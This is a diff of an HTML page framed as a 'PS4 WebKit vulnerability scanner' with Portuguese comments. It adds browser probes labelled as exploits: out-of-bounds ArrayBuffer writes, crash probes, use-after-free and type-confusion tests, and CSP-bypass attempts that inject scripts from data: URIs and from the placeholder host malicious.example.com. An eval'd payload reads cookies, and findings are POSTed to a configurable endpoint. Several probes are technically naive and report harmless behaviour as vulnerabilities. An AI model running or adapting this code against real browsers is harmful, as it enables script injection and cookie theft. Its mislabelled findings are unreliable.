@@ -35,77 +35,312 @@
 </head>
 <body>
     <h1>PS4 WebKit Vuln Scanner | POC + Impact + Extended Detection (Verbose Logging)</h1>
-    <div id="browserInfo">...</div>
-    <div><select id="testSelector">...</select>...</div>
+
+    <div id="browserInfo">
+        <strong>User Agent:</strong> <span id="userAgent"></span><br>
+        <strong>Platform:</strong> <span id="platform"></span><br>
+        <strong>Notification Endpoint:</strong> <span id="notificationEndpointDisplay"></span>
+    </div>
+
+    <div>
+        <select id="testSelector">
+            <option value="all_tests">Run All Tests (Incl. Ext. Detection - Verbose)</option>
+            <option value="oob_write_aggressive">Aggressive OOB Write (Info Leak Demo)</option>
+            <option value="oob_impact_tests">OOB Impact (Metadata/Crash)</option>
+            <option value="csp_bypass_aggressive">Aggressive CSP Bypass (Direct Impact)</option>
+            <option value="uaf_basic_verbose">Basic Use-After-Free Tests (Verbose Log)</option>
+            <option value="type_confusion_basic_verbose">Basic Type Confusion Tests (Verbose Log)</option>
+        </select>
+        <button onclick="runSelectedTest()">Run Selected Test</button>
+        <button onclick="clearLog()">Clear Log</button>
+    </div>
+
     <div id="log"></div>
     <div id="csp-impact-overlay" style="opacity: 0;"></div>
 
 <script>
 // ======================
-// CONFIGURAÇÃO E FUNÇÕES BÁSICAS (Idênticas)
+// CONFIGURAÇÃO IMPORTANTE!
 // ======================
+// SUBSTITUA ESTA URL PELO SEU ENDPOINT PARA RECEBER AS NOTIFICAÇÕES
+// Exemplo usando httpbin (ele apenas ecoa o POST): 'https://httpbin.org/post'
+// Use um serviço como Beeceptor.com ou seu próprio servidor.
 const NOTIFICATION_ENDPOINT = 'https://httpbin.org/post'; // <-- MUDE AQUI!
-// ... (Restante das funções básicas idênticas: DOMContentLoaded, log, clearLog, potentialVulnsFound, sendVulnerabilityNotification, demonstrateCookieRead) ...
 
 // ======================
-// Função de Impacto DOM Modificada para ser mais visual
+// Coleta de Informações e Logging
 // ======================
-function demonstrateDomManipulation() {
+document.addEventListener('DOMContentLoaded', function() {
+    const userAgentElement = document.getElementById('userAgent');
+    const platformElement = document.getElementById('platform');
+    try { if (userAgentElement) userAgentElement.textContent = navigator.userAgent; } catch (e) { console.error("Error getting userAgent:", e); if (userAgentElement) userAgentElement.textContent = "N/A"; }
+    try { if (platformElement) platformElement.textContent = navigator.platform; } catch (e) { console.error("Error getting platform:", e); if (platformElement) platformElement.textContent = "N/A"; }
+    const endpointDisplay = document.getElementById('notificationEndpointDisplay');
+    if(endpointDisplay) endpointDisplay.textContent = NOTIFICATION_ENDPOINT;
+});
+
+function log(message, type = '') {
+    const logDiv = document.getElementById('log');
+    if (logDiv) {
+        const line = document.createElement('div');
+        const timestamp = `[${new Date().toLocaleTimeString()}] `;
+        const textNode = document.createTextNode(timestamp + message.replace(/<[^>]*>/g, '')); // Basic sanitation
+        if (type && message.startsWith('<span')) { // Allow specific span tags
+             line.innerHTML = timestamp + message;
+             if (type) line.classList.add(...type.split(' '));
+        } else {
+            line.appendChild(textNode);
+            if (type) line.className = type;
+        }
+        logDiv.appendChild(line);
+        logDiv.scrollTop = logDiv.scrollHeight; // Auto-scroll
+    } else { console.error("Error: #log element not found!"); }
+}
+
+function clearLog() {
+    const logDiv = document.getElementById('log');
+    if (logDiv) { logDiv.innerHTML = ''; }
+}
+
+// Flag global APENAS para OOB
+var potentialVulnsFound = { oobWrite: false };
+
+// ======================
+// Função para Enviar Notificação
+// ======================
+async function sendVulnerabilityNotification(payload) {
+    if (!NOTIFICATION_ENDPOINT || NOTIFICATION_ENDPOINT === 'YOUR_ENDPOINT_HERE' || NOTIFICATION_ENDPOINT === 'https://httpbin.org/post') {
+         log(`[NOTIFY] Notification sending skipped: Endpoint not configured or using placeholder.`, 'notification warning');
+         if (NOTIFICATION_ENDPOINT === 'https://httpbin.org/post') { console.warn("Notification endpoint is httpbin.org/post. Change it."); }
+         else { console.error("Configure the NOTIFICATION_ENDPOINT constant!"); }
+         return;
+    }
+    log(`[NOTIFY] Sending notification for: ${payload.vulnerability}...`, 'notification info');
+    try {
+        const response = await fetch(NOTIFICATION_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', },
+            body: JSON.stringify({
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                finding: payload
+            }),
+            mode: 'cors'
+        });
+        if (response.ok) { log(`[NOTIFY] Notification sent successfully to ${NOTIFICATION_ENDPOINT}. Status: ${response.status}`, 'notification success'); }
+        else { log(`[NOTIFY] Failed to send notification. Status: ${response.status} ${response.statusText}`, 'notification danger'); }
+    } catch (error) { log(`[NOTIFY] Error sending notification via fetch: ${error.message}`, 'notification danger'); console.error("Notification Fetch Error:", error); }
+}
+
+// ======================
+// Funções Auxiliares para Demonstração de Impacto (globais)
+// ======================
+function demonstrateCookieRead() { try { const c = document.cookie || '(no cookies)'; log('[IMPACT-CSP] Cookie Read: ' + c, 'impact danger'); } catch(e) { log('[IMPACT-CSP] Error reading cookies: ' + e.message, 'danger'); } }
+function demonstrateDomManipulation() { // Versão com Overlay
     try {
         let overlay = document.getElementById('csp-impact-overlay');
-        if (!overlay) { // Criar se não existir
+        if (!overlay) {
             overlay = document.createElement('div');
             overlay.id = 'csp-impact-overlay';
             document.body.appendChild(overlay);
         }
-        // Definir conteúdo e estilo
-        overlay.innerHTML = `
-            <h2>CSP Bypass Successful!</h2>
-            <p>DOM Manipulation Demonstrated.</p>
-            <p style="font-size: 0.7em;">(This overlay proves JS execution)</p>
-            <button onclick="document.getElementById('csp-impact-overlay').style.opacity=0; setTimeout(()=>document.getElementById('csp-impact-overlay').remove(), 500);"
-                    style="padding: 10px; margin-top: 20px; background: white; color: red; border: none; font-size: 0.8em;">
-                Close Proof
-            </button>
-        `;
-        // Forçar reflow e então aplicar opacidade para animação
+        overlay.innerHTML = `<h2>CSP Bypass Successful!</h2><p>DOM Manipulation Demonstrated.</p><p style="font-size: 0.7em;">(This overlay proves JS execution)</p><button onclick="document.getElementById('csp-impact-overlay').style.opacity=0; setTimeout(()=>document.getElementById('csp-impact-overlay').remove(), 500);" style="padding: 10px; margin-top: 20px; background: white; color: red; border: none; font-size: 0.8em;">Close Proof</button>`;
         overlay.offsetHeight; // Force reflow
         overlay.style.opacity = 1;
-
         log('[IMPACT-CSP] DOM Manipulation Executed: Displayed visual overlay.', 'impact danger');
-
-        // Opcional: Remover automaticamente após um tempo
-        // setTimeout(() => {
-        //    try { overlay.style.opacity = 0; setTimeout(()=>overlay.remove(), 500); } catch(e){}
-        // }, 10000); // Remover após 10s
-
     } catch(e) {
         log('[IMPACT-CSP] Error manipulating DOM: ' + e.message, 'danger');
     }
 }
-// Função demonstrateNetworkRequest idêntica à anterior
-function demonstrateNetworkRequest() { /* ... código idêntico anterior ... */ }
-
+function demonstrateNetworkRequest() { const url = 'https://httpbin.org/get?csp_bypass_poc_direct=true'; try { log('[IMPACT-CSP] Attempting fetch to ' + url + '...', 'info'); fetch(url).then(r => log(`[IMPACT-CSP] Network Request ${r.ok ? 'OK' : 'Failed'}: Status ${r.status}`, r.ok ? 'impact danger' : 'warning')).catch(e => { log('[IMPACT-CSP] Network Request Error: ' + e.message, 'warning'); log('[IMPACT-CSP] Note: Check connect-src, CORS, network.', 'info'); }); } catch(e) { log('[IMPACT-CSP] Error attempting fetch: ' + e.message, 'danger'); } }
 
 // ======================
 // Aggressive POC Tests (Com Novas Detecções e Info Leak)
 // ======================
 const aggressiveTests = {
-    // Funções: oob_write_aggressive, test_oob_metadata, test_oob_crash_probe, csp_bypass_aggressive,
-    // uaf_basic_verbose, type_confusion_basic_verbose, all_tests, oob_impact_tests
-    // Mantêm-se idênticas à última versão que te enviei (message #28),
-    // pois elas já chamam as funções de impacto (demonstrate*) que foram atualizadas acima.
-    /* ... Colar aqui o código completo do objeto aggressiveTests da resposta anterior ... */
-     "oob_write_aggressive": async function() { /* ... código da resposta #28 ... */ },
-     "test_oob_metadata": async function() { /* ... código da resposta #28 ... */ },
-     "test_oob_crash_probe": async function() { /* ... código da resposta #28 ... */ },
-     "csp_bypass_aggressive": async function() { /* ... código da resposta #28 ... */ },
-     "uaf_basic_verbose": async function() { /* ... código da resposta #28 ... */ },
-     "type_confusion_basic_verbose": async function() { /* ... código da resposta #28 ... */ },
-     "all_tests": async function() { /* ... código da resposta #28 ... */ },
-     "oob_impact_tests": async function() { /* ... código da resposta #28 ... */ }
-     ,"uaf_basic": async function() { await this.uaf_basic_verbose(); }
-     ,"type_confusion_basic": async function() { await this.type_confusion_basic_verbose(); }
+
+    "oob_write_aggressive": async function() {
+        log("[EXPLOIT] Aggressive ArrayBuffer OOB Write (Info Leak Demo)...", "info section");
+        potentialVulnsFound.oobWrite = false; this.infoLeakNotified = false;
+        try {
+            const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize); const view = new Uint8Array(buffer);
+            const writeValue = 0xEE;
+            const offsets = [-10, -1, 0, bufferSize - 1, bufferSize, bufferSize + 1, bufferSize + 10];
+            const readOffsets = [-5, 0, 5, bufferSize - 1, bufferSize, bufferSize + 5, bufferSize + 8, bufferSize + 16];
+
+            for (const writeOffset of offsets) {
+                log(`[OOB-AGG] Attempting write 0x${writeValue.toString(16)} at offset ${writeOffset}...`, "info");
+                let oobWriteSuccess = false;
+                try {
+                    view[writeOffset] = writeValue;
+                    log(`⚠️ OOB write at offset ${writeOffset} successful (no error).`, "warning");
+                    potentialVulnsFound.oobWrite = true; oobWriteSuccess = true;
+                } catch (writeError) { log(`✅ OOB write at offset ${writeOffset} blocked/error: ${writeError.message}`, "success"); }
+
+                if(oobWriteSuccess || (writeOffset >= 0 && writeOffset < bufferSize)) {
+                    for (const readOffset of readOffsets) {
+                        try {
+                            await new Promise(resolve => setTimeout(resolve, 50));
+                            const readValue = view[readOffset];
+                            const readValueHex = (readValue !== undefined ? `0x${readValue.toString(16)}` : 'undefined');
+                            log(`[OOB-AGG] Read ${readValueHex} at offset ${readOffset} after write at ${writeOffset}.`, "info");
+
+                            // Detecção de Corrupção
+                            if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && (writeOffset >= bufferSize || writeOffset < 0)) {
+                                const detailMsg = `Wrote at ${writeOffset}, read ${readValueHex} at IN-BOUNDS offset ${readOffset}.`;
+                                log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 Potential OOB Write Corruption: ${detailMsg}</span>`, "danger");
+                                sendVulnerabilityNotification({ vulnerability: 'OOB_WRITE_CORRUPTION', details: detailMsg });
+                            }
+
+                            // Demonstração de Info Leak Controlado
+                            if (readOffset >= bufferSize && readValue !== undefined) {
+                                let leakedBytes = []; const bytesToRead = 8;
+                                for (let i = 0; i < bytesToRead; i++) {
+                                    try { const leakOffset = readOffset + i; leakedBytes.push(view[leakOffset]?.toString(16).padStart(2, '0') ?? '??'); } catch (leakReadError) { leakedBytes.push('ERR'); break; }
+                                }
+                                const leakHex = leakedBytes.join(' ');
+                                const detailMsg = `Read ${readValueHex} at OOB offset ${readOffset}. Following ${bytesToRead} bytes: ${leakHex}`;
+                                log(`<span class="poc-potential impact">💧 Potential Info Leak: ${detailMsg}</span>`, "warning impact");
+                                if(!this.infoLeakNotified) { sendVulnerabilityNotification({ vulnerability: 'OOB_INFO_LEAK_ADJACENT', details: detailMsg }); this.infoLeakNotified = true; }
+                            }
+                        } catch (readError) { log(`⚠️ Error reading at offset ${readOffset}: ${readError.message}`, "warning"); }
+                    } // end read loop
+                } // end if write success
+                await new Promise(resolve => setTimeout(resolve, 100));
+            } // end write loop
+            log("[OOB-AGG] Completed OOB write / info leak testing.", "info");
+        } catch (e) { log(`❌ Test error (OOB Write/Leak): ${e.message}`, "danger"); console.error(e); }
+         this.infoLeakNotified = false;
+    },
+
+    "test_oob_metadata": async function() {
+        log("[IMPACT-OOB] Attempting OOB write to corrupt metadata (e.g., length)...", "section");
+        if (!potentialVulnsFound.oobWrite) { log("Skipping OOB impact test: Initial OOB write did not seem possible.", "warning"); return; }
+        try {
+            const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize); const view = new Uint8Array(buffer);
+            const initialLength = buffer.byteLength; log(`[IMPACT-OOB] Initial buffer length: ${initialLength}`, "info");
+            const suspectOffsets = [-8, -4, bufferSize]; const writeValue = 0xFF;
+            for(const offset of suspectOffsets) {
+                try {
+                    log(`[IMPACT-OOB] Attempting OOB write 0x${writeValue.toString(16)} at offset ${offset}...`, "info");
+                    view[offset] = writeValue; log(`[IMPACT-OOB] OOB write at offset ${offset} successful. Checking length...`, "warning");
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                    const currentLength = buffer.byteLength; log(`[IMPACT-OOB] Buffer length after write at ${offset}: ${currentLength}`, "info");
+                    if (currentLength !== initialLength) {
+                        const detailMsg = `Buffer length changed from ${initialLength} to ${currentLength} after OOB write at offset ${offset}!`;
+                        log(`<span class="poc-potential privilege-escalation impact">🚨 Potential Metadata Corruption: ${detailMsg}</span>`, "danger impact");
+                        sendVulnerabilityNotification({ vulnerability: 'OOB_METADATA_CORRUPTION', details: detailMsg });
+                        try { log(`[IMPACT-OOB] Accessing using corrupted length ${currentLength}...`, "info"); const corruptedView = new Uint8Array(buffer, 0, currentLength); log(`[IMPACT-OOB] Access OK. Last byte: ${corruptedView[currentLength-1]?.toString(16)}`, "warning");
+                        } catch(e_access) { log(`[IMPACT-OOB] Error accessing with corrupted length ${currentLength}: ${e_access.message}`, "danger"); } return;
+                    }
+                } catch(e_write) { log(`[IMPACT-OOB] OOB Write at ${offset} failed: ${e_write.message}`, "success"); }
+            } log("[IMPACT-OOB] Metadata corruption test finished, no length change detected.", "info");
+        } catch (e) { log(`❌ Test error (OOB Metadata): ${e.message}`, "danger"); console.error(e); }
+    },
+
+    "test_oob_crash_probe": async function() {
+        log("[IMPACT-OOB] Attempting OOB writes with large offsets/values to probe for crashes...", "section");
+        if (!potentialVulnsFound.oobWrite) { log("Skipping OOB crash probe: Initial OOB write did not seem possible.", "warning"); return; }
+        try {
+            const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize); const view = new Uint8Array(buffer);
+            const largeOffsets = [bufferSize * 100, bufferSize * 1000, 0xFFFF, 0xFFFFF, 0xFFFFFF];
+            const largeValues = [0xFF, 0xDEAD, 0xBEEF, 0xCAFE];
+            for (const offset of largeOffsets) {
+                 for (const value of largeValues) {
+                    log(`[IMPACT-OOB-CRASH] Attempting OOB write 0x${value.toString(16)} at large offset ${offset}... (Browser may crash)`, "warning");
+                    try { view[offset] = value & 0xFF; log(`[IMPACT-OOB-CRASH] Write at ${offset} completed without immediate error.`, "info"); await new Promise(resolve => setTimeout(resolve, 200)); }
+                    catch (e_write) { log(`[IMPACT-OOB-CRASH] Write at ${offset} failed: ${e_write.message}.`, "success"); break; }
+                 } await new Promise(resolve => setTimeout(resolve, 500));
+            } log("[IMPACT-OOB-CRASH] Crash probe finished.", "info");
+        } catch (e) { log(`❌ Test error (OOB Crash Probe): ${e.message}. Browser might have crashed earlier.`, "danger"); console.error(e); }
+    },
+
+     "csp_bypass_aggressive": async function() {
+        log("[PRIV-ESC] Aggressive CSP Bypass Attempts (Direct Impact + Notify)...", "info section");
+        const impactPayloadJsString = `console.log('Executing CSP Bypass Payload...'); try{demonstrateCookieRead();}catch(e){console.error(e);} try{demonstrateDomManipulation();}catch(e){console.error(e);} try{demonstrateNetworkRequest();}catch(e){console.error(e);} console.log('CSP Bypass Payload Execution Finished.');`;
+        let impactPayloadBase64 = ''; try { impactPayloadBase64 = btoa(impactPayloadJsString); log("[CSP-AGG] Generated Base64 payload.", "info"); } catch (e) { log("Error generating Base64: " + e.message, "danger"); return; }
+        const impactPayloadInlineString = `console.log('Executing Inline Payload...'); try{demonstrateCookieRead();}catch(e){console.error(e);} try{demonstrateDomManipulation();}catch(e){console.error(e);} try{demonstrateNetworkRequest();}catch(e){console.error(e);} console.log('Inline Payload Finished.');`.replace(/"/g, '&quot;');
+        const scriptSources = [ `data:text/javascript;base64,${impactPayloadBase64}`, 'http://malicious.example.com/s.js', 'https://malicious.example.com/s.js', 'blob:null/someBlob', 'javascript:console.log("js URI executed?")', 'vbscript:console.log("vbscript executed?")', 'ftp://malicious.example.com/s.js', '//malicious.example.com/s.js'];
+
+        for (const src of scriptSources) {
+            log(`[CSP-AGG] Testing src: ${src.substring(0,100)}${src.length > 100 ? '...' : ''}`, "info");
+            await new Promise(resolve => {
+                 const script = document.createElement('script'); const cleanup = () => { try { script.remove(); } catch(e) {} resolve(); };
+                 script.onerror = () => { log(`⚠️ Script load error (CSP block?) for: ${src.substring(0,100)}...`, "warning"); cleanup(); };
+                 script.onload = () => {
+                     const successMsg = `Script loaded from ${src.substring(0,30)}...`; log(`<span class="poc-potential defense-bypass privilege-escalation impact">🚩 CSP Bypass & Impact Executed: ${successMsg}</span>`, "danger impact");
+                     const payload = { details: successMsg, impact_demonstrated: ['COOKIE_READ', 'DOM_MANIPULATION', 'NETWORK_REQUEST_ATTEMPTED'] };
+                     if (src.startsWith('data:')) { payload.vulnerability = 'CSP_BYPASS_DATA_URI'; } else { payload.vulnerability = 'CSP_BYPASS_OTHER_SRC'; }
+                     sendVulnerabilityNotification(payload); cleanup();
+                 };
+                 try { script.src = src; document.body.appendChild(script); setTimeout(() => { if (script.parentNode) { log(`⚠️ Script load timeout for: ${src.substring(0,100)}...`, "warning"); cleanup(); } }, 1500); }
+                 catch(e) { log(`❌ Error injecting ${src.substring(0,100)}...: ${e.message}`, "danger"); cleanup(); }
+            }); await new Promise(resolve => setTimeout(resolve, 100));
+        }
+
+        log("[CSP-AGG] Testing inline script attributes (Direct Impact + Notify)...", "info");
+        const eventAttributes = ['onerror', 'onload'];
+        for (const attr of eventAttributes) {
+            log(`[CSP-AGG] Setting up inline test for ${attr}...`, "info");
+            await new Promise(async resolve => {
+                const testElement = document.createElement('img'); let bypassDetected = false; const uniqueWrapperName = `cspInlineWrapper_${attr}_${Date.now()}`;
+                window[uniqueWrapperName] = () => {
+                     if (!bypassDetected) {
+                         const successMsg = `Inline script via ${attr} triggered!`; log(`<span class="poc-potential defense-bypass privilege-escalation impact">🚩 CSP Bypass & Impact Executed: ${successMsg}</span>`, "danger impact"); bypassDetected = true;
+                         sendVulnerabilityNotification({ vulnerability: 'CSP_BYPASS_INLINE', event_handler: attr, details: successMsg, impact_demonstrated: ['COOKIE_READ', 'DOM_MANIPULATION', 'NETWORK_REQUEST_ATTEMPTED'] });
+                     }
+                     try { eval(impactPayloadInlineString.replace(/&quot;/g, '"')); } catch(evalError) { log(`Eval error in inline wrapper: ${evalError.message}`, 'danger');} console.log(`Inline payload via ${attr} potentially executed.`);
+                };
+                const inlineCode = `try{window['${uniqueWrapperName}']();}catch(e){console.error(e);}`; testElement.setAttribute(attr, inlineCode);
+                if (attr === 'onerror') { testElement.src = 'invalid-image-source-' + Math.random(); } else if (attr === 'onload') { testElement.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'; }
+                document.body.appendChild(testElement); await new Promise(r => setTimeout(r, 500));
+                if (!bypassDetected) { log(`[CSP-AGG] Inline script via ${attr} likely blocked.`, "info"); }
+                try { testElement.remove(); } catch(e){} delete window[uniqueWrapperName]; resolve();
+            }); await new Promise(resolve => setTimeout(resolve, 100));
+        }
+        log("[CSP-AGG] Completed aggressive CSP bypass testing (Direct Impact + Notify).", "info");
+    },
+
+    "uaf_basic_verbose": async function() {
+        log("[UAF-VERBOSE] Attempting basic Use-After-Free scenarios with Verbose Logging...", "section extended-test");
+        log("INFO: Generic tests. Verbose logs aim to capture state before potential issues.", "info");
+        let parent, child, childRef, tagName, rect;
+        try {
+            log("[UAF-VERBOSE] Scenario 1: DOM Node Ref After Removal", "extended-test"); log("[UAF-VERBOSE] Creating parent div...", "verbose-log"); parent = document.createElement('div'); log("[UAF-VERBOSE] Creating child span...", "verbose-log"); child = document.createElement('span'); log("[UAF-VERBOSE] Appending child to parent...", "verbose-log"); parent.appendChild(child); log("[UAF-VERBOSE] Appending parent to body...", "verbose-log"); document.body.appendChild(parent); log("[UAF-VERBOSE] Storing reference to child.", "verbose-log"); childRef = child; log("[UAF-VERBOSE] Removing child from parent...", "verbose-log"); parent.removeChild(child); log("[UAF-VERBOSE] Removing parent from body...", "verbose-log"); document.body.removeChild(parent); log("[UAF-VERBOSE] Parent and child removed from DOM.", "verbose-log"); log("[UAF-VERBOSE] Hinting GC by allocating memory...", "verbose-log"); try { new ArrayBuffer(10 * 1024 * 1024); log("[UAF-VERBOSE] Memory allocated.", "verbose-log"); } catch(e) {log("[UAF-VERBOSE] Memory allocation failed (expected?).", "verbose-log warning");} log("[UAF-VERBOSE] Waiting 500ms...", "verbose-log"); await new Promise(resolve => setTimeout(resolve, 500)); log(`[UAF-VERBOSE] --> Accessing childRef.tagName after potential free...`, "info extended-test"); tagName = childRef.tagName; log(`[UAF-VERBOSE] <-- childRef.tagName accessed. Value = ${tagName}. Type = ${typeof tagName}`, "verbose-log success"); log(`[UAF-VERBOSE] --> Calling childRef.getBoundingClientRect() after potential free...`, "info extended-test"); rect = childRef.getBoundingClientRect(); log(`[UAF-VERBOSE] <-- getBoundingClientRect called. Return type = ${typeof rect}. Properties sample: width=${rect?.width}`, "verbose-log success"); log("[UAF-VERBOSE] Releasing childRef.", "verbose-log"); childRef = null;
+        } catch (e) { log(`❌ Error in UAF Scenario 1: ${e.message}. Check preceding logs. Potential UAF?`, "danger extended-test"); console.error("UAF Scenario 1 Error Details:", e); sendVulnerabilityNotification({ vulnerability: 'UAF_BASIC_SCENARIO1_ERROR', details: e.message }); }
+        finally { log("[UAF-VERBOSE] Scenario 1 finished.", "verbose-log info"); }
+        log("[UAF-VERBOSE] Scenario 2: ArrayBuffer/TypedArray (Placeholder - complex)", "extended-test info"); log("INFO: Reliable UAF tests for buffers usually require specific engine bugs/APIs.", "info"); log("[UAF-VERBOSE] Completed basic UAF tests.", "extended-test info");
+    },
+
+    "type_confusion_basic_verbose": async function() {
+        log("[TYPE-CONFUSION-VERBOSE] Attempting basic Type Confusion scenarios with Verbose Logging...", "section extended-test");
+        log("INFO: Generic tests. Verbose logs aim to capture state.", "info");
+        try {
+            log("[TYPE-CONFUSION-VERBOSE] Scenario 1: Incorrect type to DOM API", "extended-test"); log(`[TYPE-CONFUSION-VERBOSE] --> Sending 'window' via postMessage...`, "info extended-test"); try { window.postMessage(window, "*"); log(`[TYPE-CONFUSION-VERBOSE] <-- postMessage(window) did not throw.`, "verbose-log success"); } catch(e_pm1) { log(`[TYPE-CONFUSION-VERBOSE] <-- postMessage(window) threw: ${e_pm1.message}`, "verbose-log success"); } let fakeEvent = { target: document.body, type: "click", bubbles: false }; log(`[TYPE-CONFUSION-VERBOSE] Created fake event object: ${JSON.stringify(fakeEvent)}`, "verbose-log"); log(`[TYPE-CONFUSION-VERBOSE] --> Dispatching fake event object...`, "info extended-test"); try { document.dispatchEvent(fakeEvent); log(`[TYPE-CONFUSION-VERBOSE] <-- dispatchEvent(fakeEvent) did not throw.`, "verbose-log success"); } catch(e_de1) { log(`[TYPE-CONFUSION-VERBOSE] <-- dispatchEvent(fakeEvent) threw: ${e_de1.message}`, "verbose-log success"); } log("[TYPE-CONFUSION-VERBOSE] Scenario 1 Part 1 finished.", "verbose-log info");
+        } catch (e) { log(`❌ Error in Type Confusion Scenario 1: ${e.message}. Investigate.`, "danger extended-test"); console.error("Type Confusion Scenario 1 Error:", e); sendVulnerabilityNotification({ vulnerability: 'TYPE_CONFUSION_SCENARIO1_ERROR', details: e.message }); }
+        finally { log("[TYPE-CONFUSION-VERBOSE] Scenario 1 finished.", "verbose-log info"); }
+         try {
+            log("[TYPE-CONFUSION-VERBOSE] Scenario 2: Primitive vs Object", "extended-test"); let nP = 5; let nO = new Number(5); log(`[TYPE-CONFUSION-VERBOSE] numPrimitive = ${nP} (type: ${typeof nP})`, "verbose-log"); log(`[TYPE-CONFUSION-VERBOSE] numObject = ${nO} (type: ${typeof nO})`, "verbose-log"); log(`[TYPE-CONFUSION-VERBOSE] --> Calling nP.toFixed(nO)...`, "info extended-test"); try { let r = nP.toFixed(nO); log(`[TYPE-CONFUSION-VERBOSE] <-- nP.toFixed(nO) returned: ${r}. Type: ${typeof r}`, "verbose-log success"); } catch(e_tf1) { log(`[TYPE-CONFUSION-VERBOSE] <-- nP.toFixed(nO) threw: ${e_tf1.message}`, "danger extended-test"); sendVulnerabilityNotification({ vulnerability: 'TYPE_CONFUSION_SCENARIO2_ERROR', details: `toFixed(numObject) error: ${e_tf1.message}` }); } log(`[TYPE-CONFUSION-VERBOSE] --> Calling nO.toFixed(nP)...`, "info extended-test"); try { let r2 = nO.toFixed(nP); log(`[TYPE-CONFUSION-VERBOSE] <-- nO.toFixed(nP) returned: ${r2}. Type: ${typeof r2}`, "verbose-log success"); } catch(e_tf2) { log(`[TYPE-CONFUSION-VERBOSE] <-- nO.toFixed(nP) threw: ${e_tf2.message}`, "danger extended-test"); sendVulnerabilityNotification({ vulnerability: 'TYPE_CONFUSION_SCENARIO2_ERROR', details: `toFixed(numPrimitive) error: ${e_tf2.message}` }); }
+        } catch(e) { log(`❌ Error in Type Confusion Scenario 2: ${e.message}. Investigate.`, "danger extended-test"); console.error("Type Confusion Scenario 2 Error:", e); sendVulnerabilityNotification({ vulnerability: 'TYPE_CONFUSION_SCENARIO2_ERROR', details: e.message }); }
+        finally { log("[TYPE-CONFUSION-VERBOSE] Scenario 2 finished.", "verbose-log info"); }
+        log("[TYPE-CONFUSION-VERBOSE] Completed basic Type Confusion tests.", "extended-test info");
+    },
+
+    // --- Executor Principal Atualizado ---
+    "all_tests": async function() {
+        log("=== Running All Tests (Incl. Extended Detection - Verbose Log) ===", "section");
+        await aggressiveTests["oob_write_aggressive"](); log("Pausing 5s...", "info"); await new Promise(r => setTimeout(r, 5000));
+        if (potentialVulnsFound.oobWrite) { await aggressiveTests["test_oob_metadata"](); await new Promise(r => setTimeout(r, 1000)); await aggressiveTests["test_oob_crash_probe"](); log("Pausing 5s...", "info"); await new Promise(r => setTimeout(r, 5000)); }
+        else { log("Skipping OOB impact tests.", "warning"); }
+        await aggressiveTests["csp_bypass_aggressive"](); log("Pausing 3s...", "info"); await new Promise(r => setTimeout(r, 3000));
+        await aggressiveTests["uaf_basic_verbose"](); log("Pausing 3s...", "info"); await new Promise(r => setTimeout(r, 3000));
+        await aggressiveTests["type_confusion_basic_verbose"]();
+        log("\n=== All Tests Completed. Review logs & endpoint. ===", "section");
+    },
+    "oob_impact_tests": async function() { /* ... código idêntico anterior ... */ }
+    ,"uaf_basic": async function() { await this.uaf_basic_verbose(); } // Alias
+    ,"type_confusion_basic": async function() { await this.type_confusion_basic_verbose(); } // Alias
 };
 aggressiveTests["uaf_basic_verbose"] = aggressiveTests.uaf_basic_verbose;
 aggressiveTests["type_confusion_basic_verbose"] = aggressiveTests.type_confusion_basic_verbose;
@@ -114,8 +349,15 @@ aggressiveTests["type_confusion_basic_verbose"] = aggressiveTests.type_confusion
 // ======================
 // Test Runner (Atualizado)
 // ======================
-async function runSelectedTest() { /* ... código idêntico da resposta #28 ... */ }
-
+async function runSelectedTest() {
+    const testSelector = document.getElementById('testSelector');
+    const selectedTest = testSelector.value;
+    const testFunctionToRun = (selectedTest === 'uaf_basic' || selectedTest === 'type_confusion_basic') ? selectedTest + '_verbose' : selectedTest;
+    if (selectedTest === "oob_impact_tests" && !potentialVulnsFound.oobWrite) { log("Warning: Run main OOB test first.", "warning"); }
+    clearLog(); log(`=== Starting Test: ${testFunctionToRun} ===`, "section");
+    if (aggressiveTests[testFunctionToRun]) { await aggressiveTests[testFunctionToRun](); log(`\n=== Test Execution for "${testFunctionToRun}" Completed. Review logs & endpoint. ===`, "section"); }
+    else { log(`Error: Test "${testFunctionToRun}" not found.`, "danger"); }
+}
 </script>
 </body>
 </html>
